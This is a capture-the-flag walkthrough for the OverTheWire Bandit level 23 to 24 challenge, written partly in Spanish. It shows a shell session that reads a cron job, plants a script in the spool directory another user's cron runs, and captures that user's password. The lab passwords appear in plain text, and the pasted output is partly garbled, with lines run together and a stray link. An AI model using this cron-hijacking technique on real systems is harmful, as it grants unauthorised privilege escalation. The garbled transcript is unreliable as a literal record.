# Bandit

## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso
bandit23
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

## Solución 
```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24  
[@reboot](http://twitter.com/reboot) bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null  
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null  
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh  
#!/bin/bashmyname=$(whoami)cd /var/spool/$myname  
echo "Executing and deleting all scripts in /var/spool/$myname:"  
for i in * .*;  
do  
    if [ "$i" != "." -a "$i" != ".." ];  
    then  
        echo "Handling $i"  
        **timeout -s 9 60 ./$i**  
        rm -f ./$i  
    fi  
done
bandit23@bandit:~$ mkdir -p /tmp/secttp  
bandit23@bandit:~$ cd /tmp/secttp  
bandit23@bandit:/tmp/secttp$ touch secttp.sh  
bandit23@bandit:/tmp/secttp$ chmod 777 secttp.sh  
bandit23@bandit:/tmp/secttp$ ls -al secttp.sh  
-rwxrwxrwx 1 bandit23 root 68 Mar 26 08:09 secttp.shbandit23@bandit:/tmp/secttp$ vim secttp.sh
bandit23@bandit:/tmp/secttp$ touch password  
bandit23@bandit:/tmp/secttp$ chmod 666 password  
bandit23@bandit:/tmp/secttp$ ls -al password  
-rw-rw-rw- 1 bandit23 root 0 Mar 26 08:11 password
bandit23@bandit:/tmp/secttp$ cp secttp.sh /var/spool/bandit24/  
bandit23@bandit:/tmp/secttp$ ls -al /var/spool/bandit24/secttp.sh  
-rwxr-xr-x 1 bandit23 bandit23 68 Mar 26 08:16 /var/spool/bandit24/secttp.shbandit23@bandit:/tmp/secttp$ ls -al password  
-rw-rw-rw- 1 bandit23 root **0** Mar 26 08:17 password...(wait a minute)bandit23@bandit:/tmp/secttp$ ls -al password  
-rw-rw-rw- 1 bandit23 root **33** Mar 26 08:18 password  
bandit23@bandit:/tmp/secttp$ cat password  
**UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ**
```

## Notas adicionales

## Referencias